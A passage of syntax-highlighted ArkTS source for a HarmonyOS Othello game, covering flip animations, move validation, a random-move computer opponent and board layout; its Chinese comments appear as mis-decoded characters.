class="property">Linear</span>, <span class="comment">// åŠ¨ç”»æ›²çº¿ç±»å‹</span></span><br><span class="line">          <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å®Œæˆåçš„å›è°ƒ</span></span><br><span class="line"> </span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span>; <span class="comment">// è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºåœæ­¢</span></span><br><span class="line">            <span class="keyword">if</span> (callback) &#123; <span class="comment">// å¦‚æœæœ‰å›è°ƒå‡½æ•°ï¼Œåˆ™æ‰§è¡Œ</span></span><br><span class="line">              <span class="title function_">callback</span>();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;, <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å¼€å§‹æ—¶çš„å›è°ƒ</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">frontVisibility</span> = <span class="number">2</span>; <span class="comment">// çœ‹åˆ°ç™½è‰²</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">180</span>; <span class="comment">// è®¾ç½®æ—‹è½¬è§’åº¦ä¸º180åº¦</span></span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å¼€å§‹æ—¶çš„å›è°ƒ</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">90</span>; <span class="comment">// è®¾ç½®æ—‹è½¬è§’åº¦ä¸º90åº¦</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">showWhiteAi</span>(<span class="params">animationTime: number, callback?: () =&gt; <span class="keyword">void</span></span>) &#123; <span class="comment">// å±•ç¤ºç™½è‰²æ£‹å­</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAnimationRunning</span>) &#123; <span class="comment">// å¦‚æœå·²ç»æœ‰åŠ¨ç”»åœ¨è¿è¡Œï¼Œåˆ™è¿”å›</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">true</span>; <span class="comment">// è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºè¿è¡Œä¸­</span></span><br><span class="line">    <span class="keyword">if</span> (animationTime == <span class="number">0</span>) &#123; <span class="comment">// å¦‚æœä¸éœ€è¦åŠ¨ç”»</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">180</span>; <span class="comment">// è®¾ç½®æ—‹è½¬è§’åº¦ä¸º180åº¦</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">frontVisibility</span> = <span class="number">2</span>; <span class="comment">// ç™½å­</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span>; <span class="comment">// è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºåœæ­¢</span></span><br><span class="line">      <span class="keyword">if</span> (callback) &#123; <span class="comment">// å¦‚æœæœ‰å›è°ƒå‡½æ•°ï¼Œåˆ™æ‰§è¡Œ</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">180</span>; <span class="comment">// è®¾ç½®æ—‹è½¬è§’åº¦ä¸º180åº¦</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">frontVisibility</span> = <span class="number">2</span>; <span class="comment">// ç™½å­</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="comment">// å¼€å§‹åŠ¨ç”»</span></span><br><span class="line">      <span class="attr">duration</span>: animationTime * <span class="number">3</span>, <span class="comment">// åŠ¨ç”»æŒç»­æ—¶é—´</span></span><br><span class="line">      <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">EaseOut</span>,</span><br><span class="line">      <span class="attr">iterations</span>: <span class="number">3</span>, <span class="comment">// åŠ¨ç”»è¿­ä»£æ¬¡æ•°</span></span><br><span class="line">      <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å®Œæˆåçš„å›è°ƒ</span></span><br><span class="line">        <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">          <span class="comment">// å†æ¬¡å¼€å§‹åŠ¨ç”»</span></span><br><span class="line">          <span class="attr">duration</span>: animationTime, <span class="comment">// åŠ¨ç”»æŒç»­æ—¶é—´</span></span><br><span class="line">          <span class="attr">iterations</span>: <span class="number">1</span>, <span class="comment">// åŠ¨ç”»è¿­ä»£æ¬¡æ•°</span></span><br><span class="line">          <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">Linear</span>, <span class="comment">// åŠ¨ç”»æ›²çº¿ç±»å‹</span></span><br><span class="line">          <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å®Œæˆåçš„å›è°ƒ</span></span><br><span class="line"> </span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span>; <span class="comment">// è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºåœæ­¢</span></span><br><span class="line">            <span class="keyword">if</span> (callback) &#123; <span class="comment">// å¦‚æœæœ‰å›è°ƒå‡½æ•°ï¼Œåˆ™æ‰§è¡Œ</span></span><br><span class="line">              <span class="title function_">callback</span>();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">opacity</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">opacity</span> = <span class="number">0.2</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TileHighlight</span> &#123;</span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">isValidMove</span>: boolean = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">OthelloGame</span> &#123;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">chessBoard</span>: <span class="title class_">ChessCell</span>[][] = [];</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cellSize</span>: number = <span class="number">70</span>;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cellSpacing</span>: number = <span class="number">5</span>;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">transitionDuration</span>: number = <span class="number">200</span>;</span><br><span class="line">  @<span class="title class_">State</span> @<span class="title class_">Watch</span>(<span class="string">&#x27;currentPlayerIsBlackChanged&#x27;</span>) <span class="attr">currentPlayerIsBlack</span>: boolean = <span class="literal">true</span>; <span class="comment">// å…ˆæ‰‹ï¼Œtrueè¡¨ç¤ºé»‘æ£‹</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">chessBoardSize</span>: number = <span class="number">8</span>; <span class="comment">// å‡è®¾æ£‹ç›˜å¤§å°ä¸º8Ã—8</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">validMoveIndicators</span>: <span class="title class_">TileHighlight</span> [][] = []</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">isTwoPlayerMode</span>: boolean = <span class="literal">false</span>; <span class="comment">//true:åŒå‡»æ¸¸æˆï¼Œfalse:å•äººæ¸¸æˆ</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">isAIPlaying</span>:boolean = <span class="literal">false</span><span class="comment">//true:AIæ­£åœ¨ä¸‹æ£‹</span></span><br><span class="line">  <span class="title function_">currentPlayerIsBlackChanged</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> color = <span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span> ? <span class="number">1</span> : <span class="number">2</span>; <span class="comment">// 1æ˜¯é»‘å­ï¼Œ2è¡¨ç¤ºç™½å­</span></span><br><span class="line">      <span class="keyword">let</span> hasMoves = <span class="variable language_">this</span>.<span class="title function_">hasValidMoves</span>(color);</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (!hasMoves) &#123;</span><br><span class="line">        <span class="keyword">let</span> opponentHasMoves = <span class="variable language_">this</span>.<span class="title function_">hasValidMoves</span>(!<span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span> ? <span class="number">1</span> : <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!opponentHasMoves) &#123;</span><br><span class="line">          <span class="keyword">const</span> winner = <span class="variable language_">this</span>.<span class="title function_">determineWinner</span>();</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(winner);</span><br><span class="line">          promptAction.<span class="title function_">showDialog</span>(&#123;</span><br><span class="line">            <span class="attr">title</span>: <span class="string">&#x27;æ¸¸æˆç»“æŸ&#x27;</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">`<span class="subst">$&#123;winner&#125;</span>`</span>,</span><br><span class="line">            <span class="attr">buttons</span>: [&#123; <span class="attr">text</span>: <span class="string">&#x27;é‡æ–°å¼€å§‹&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;#ffa500&#x27;</span> &#125;]</span><br><span class="line">          &#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">initGame</span>();</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span> = !<span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span>; <span class="comment">// åˆ‡æ¢ä¸‹ä¸€ç©å®¶</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span>) &#123; <span class="comment">// å½“å‰æ˜¯ç™½æ£‹, æ¨¡æ‹ŸAIä¸‹æ£‹</span></span><br><span class="line">          <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">isTwoPlayerMode</span>) &#123;</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">aiPlaceRandom</span>();</span><br><span class="line">            &#125;, <span class="variable language_">this</span>.<span class="property">transitionDuration</span> + <span class="number">20</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="variable language_">this</span>.<span class="property">transitionDuration</span> + <span class="number">20</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">aiPlaceRandom</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">validMoves</span>: [number, number][] = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">validMoveIndicators</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="variable language_">this</span>.<span class="property">validMoveIndicators</span>[i].<span class="property">length</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">validMoveIndicators</span>[i][j].<span class="property">isValidMove</span>) &#123;</span><br><span class="line">          validMoves.<span class="title function_">push</span>([i, j]);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (validMoves.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> randomMove = validMoves[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * validMoves.<span class="property">length</span>)];</span><br><span class="line">      <span class="keyword">let</span> chessCell = <span class="variable language_">this</span>.<span class="property">chessBoard</span>[randomMove[<span class="number">0</span>]][randomMove[<span class="number">1</span>]];</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">placeChessPiece</span>(randomMove[<span class="number">0</span>], randomMove[<span class="number">1</span>], chessCell)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">placeChessPiece</span>(<span class="params">i: number, j: number, chessCell: ChessCell</span>) &#123;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">let</span> reversibleTiles = <span class="variable language_">this</span>.<span class="title function_">findReversible</span>(i, j, <span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span> ? <span class="number">1</span> : <span class="number">2</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`reversibleTiles:<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(reversibleTiles)&#125;</span>`</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (reversibleTiles.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span> = <span class="literal">false</span>;</span><br><span class="line">        chessCell.<span class="title function_">showBlack</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; reversibleTiles.<span class="property">length</span>; i++) &#123;</span><br><span class="line">          reversibleTiles[i].<span class="title function_">flip</span>(<span class="variable language_">this</span>.<span class="property">transitionDuration</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isTwoPlayerMode</span>) &#123; <span class="comment">//åŒäººæ¸¸æˆï¼Œæ— åŠ¨ç”»</span></span><br><span class="line">          chessCell.<span class="title function_">showWhite</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; reversibleTiles.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            reversibleTiles[i].<span class="title function_">flip</span>(<span class="variable language_">this</span>.<span class="property">transitionDuration</span>);</span><br><span class="line">          &#125;</span><br><span class="line"> </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">//å•äººæ¸¸æˆï¼Œè½å­éœ€è¦é—ªçƒåŠ¨ç”»</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">isAIPlaying</span> = <span class="literal">true</span><span class="comment">//AI æ­£åœ¨ä¸‹æ£‹</span></span><br><span class="line">          chessCell.<span class="title function_">showWhiteAi</span>(<span class="variable language_">this</span>.<span class="property">transitionDuration</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; reversibleTiles.<span class="property">length</span>; i++) &#123;</span><br><span class="line">              reversibleTiles[i].<span class="title function_">flip</span>(<span class="variable language_">this</span>.<span class="property">transitionDuration</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">currentPlayerIsBlackChanged</span>()</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isAIPlaying</span> = <span class="literal">false</span><span class="comment">//AIä¸‹å®Œäº†</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">hasValidMoves</span>(<span class="params">color: number</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> hasMoves = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> row = <span class="number">0</span>; row &lt; <span class="variable language_">this</span>.<span class="property">chessBoardSize</span>; row++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; <span class="variable language_">this</span>.<span class="property">chessBoardSize</span>; col++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">chessBoard</span>[row][col].<span class="property">frontVisibility</span> === <span class="number">0</span> &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">findReversible</span>(row, col, color).<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">validMoveIndicators</span>[row][col].<span class="property">isValidMove</span> = <span class="literal">true</span>;</span><br><span class="line">          hasMoves = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">validMoveIndicators</span>[row][col].<span class="property">isValidMove</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hasMoves;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">chessBoardSize</span>; i++) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">chessBoard</span>.<span class="title function_">push</span>([]);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">validMoveIndicators</span>.<span class="title function_">push</span>([])</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="variable language_">this</span>.<span class="property">chessBoardSize</span>; j++) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">chessBoard</span>[i].<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">ChessCell</span>());</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">validMoveIndicators</span>[i].<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">TileHighlight</span>())</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">initGame</span>()</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">initGame</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span> = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">chessBoardSize</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="variable language_">this</span>.<span class="property">chessBoardSize</span>; j++) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">chessBoard</span>[i][j].<span class="property">frontVisibility</span> = <span class="number">0</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// åˆå§‹æ£‹ç›˜å¸ƒå±€</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">chessBoard</span>[<span class="number">3</span>][<span class="number">3</span>].<span class="property">frontVisibility</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">chessBoard</span>[<span class="number">3</span>][<span class="number">4</span>].<span class="property">frontVisibility</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">chessBoard</span>[<span class="number">4</span>][<span class="number">3</span>].<span class="property">frontVisibility</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">chessBoard</span>[<span class="number">4</span>][<span class="number">4</span>].<span class="property">frontVisibility</span> = <span class="number">2</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">currentPlayerIsBlackChanged</span>();</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">findReversible</span>(<span class="attr">row</span>: number, <span class="attr">col</span>: number, <span class="attr">color</span>: number): <span class="title class_">ChessCell</span>[] &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">reversibleTiles</span>: <span class="title class_">ChessCell</span>[] = [];</span><br><span class="line">    <span class="keyword">const</span> directions = [</span><br><span class="line">      [-<span class="number">1</span>, -<span class="number">1</span>], <span class="comment">// å·¦ä¸Š</span></span><br><span class="line">      [-<span class="number">1</span>, <span class="number">0</span>], <span class="comment">// æ­£ä¸Š</span></span><br><span class="line">      [-<span class="number">1</span>, <span class="number">1</span>], <span class="comment">// å³ä¸Š</span></span><br><span class="line">      [<span class="number">0</span>, -<span class="number">1</span>], <span class="comment">// å·¦</span></span><br><span class="line">      [<span class="number">0</span>, <span class="number">1</span>], <span class="comment">// å³</span></span><br><span class="line">      [<span class="number">1</span>, -<span class="number">1</span>], <span class="comment">// å·¦ä¸‹</span></span><br><span class="line">      [<span class="number">1</span>, <span class="number">0</span>], <span class="comment">// æ­£ä¸‹</span></span><br><span class="line">      [<span class="number">1</span>, <span class="number">1</span>]<span class="comment">// å³ä¸‹</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> direction <span class="keyword">of</span> directions) &#123;</span><br><span class="line">      <span class="keyword">let</span> foundOpposite = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">let</span> x = row;</span><br><span class="line">      <span class="keyword">let</span> y = col;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        x += direction[<span class="number">0</span>];</span><br><span class="line">        y += direction[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span> || y &lt; <span class="number">0</span> || x &gt;= <span class="variable language_">this</span>.<span class="property">chessBoardSize</span> || y &gt;= <span class="variable language_">this</span>.<span class="property">chessBoardSize</span>) &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> cell = <span class="variable language_">this</span>.<span class="property">chessBoard</span>[x][y];</span><br><span class="line">        <span class="keyword">if</span> (cell.<span class="property">frontVisibility</span> === <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cell.<span class="property">frontVisibility</span> === color) &#123;</span><br><span class="line">          <span class="keyword">if</span> (foundOpposite) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="attr">tempX</span>: number = x - direction[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">let</span> <span class="attr">tempY</span>: number = y - direction[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">while</span> (tempX !== row || tempY !== col) &#123;</span><br><span class="line">              reversibleTiles.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="property">chessBoard</span>[tempX][tempY]);</span><br><span class="line">              tempX -= direction[<span class="number">0</span>];</span><br><span class="line">              tempY -= direction[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          foundOpposite = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> reversibleTiles;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">determineWinner</span>(): string &#123;</span><br><span class="line">    <span class="keyword">let</span> blackCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> whiteCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> row <span class="keyword">of</span> <span class="variable language_">this</span>.<span class="property">chessBoard</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> cell <span class="keyword">of</span> row) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cell.<span class="property">frontVisibility</span> === <span class="number">1</span>) &#123;</span><br><span class="line">          blackCount++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cell.<span class="property">frontVisibility</span> === <span class="number">2</span>) &#123;</span><br><span class="line">          whiteCount++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (blackCount &gt; whiteCount) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;é»‘æ£‹è·èƒœï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (whiteCount &gt; blackCount) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;ç™½æ£‹è·èƒœï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;å¹³å±€ï¼&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">hasValidMove</span>(<span class="attr">color</span>: number): boolean &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> row = <span class="number">0</span>; row &lt; <span class="variable language_">this</span>.<span class="property">chessBoardSize</span>; row++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; <span class="variable language_">this</span>.<span class="property">chessBoardSize</span>; col++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">chessBoard</span>[row][col].<span class="property">frontVisibility</span> === <span class="number">0</span> &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">findReversible</span>(row, col, color).<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">20</span> &#125;) &#123;</span><br><span class="line">      <span class="title class_">Row</span>() &#123;</span><br><span class="line">        <span class="title class_">Row</span>() &#123;</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">``</span>)<span class="comment">// æ˜¾ç¤ºå•å…ƒæ ¼çš„å€¼æˆ–ç©ºå­—ç¬¦ä¸²</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)<span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)<span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)<span class="comment">// æ–‡æœ¬å±…ä¸­</span></span><br><span class="line">            .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Black</span>)<span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>)<span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">            .<span class="title function_">padding</span>(<span class="number">10</span>)</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`é»‘æ£‹è¡ŒåŠ¨`</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">            .<span class="title function_">padding</span>(<span class="number">10</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">visibility</span>(<span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span> ? <span class="title class_">Visibility</span>.<span class="property">Visible</span> : <span class="title class_">Visibility</span>.<span class="property">Hidden</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="title class_">Row</span>() &#123;</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`ç™½æ£‹è¡ŒåŠ¨`</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">            .<span class="title function_">padding</span>(<span class="number">10</span>)</span><br><span class="line">          <span class="title 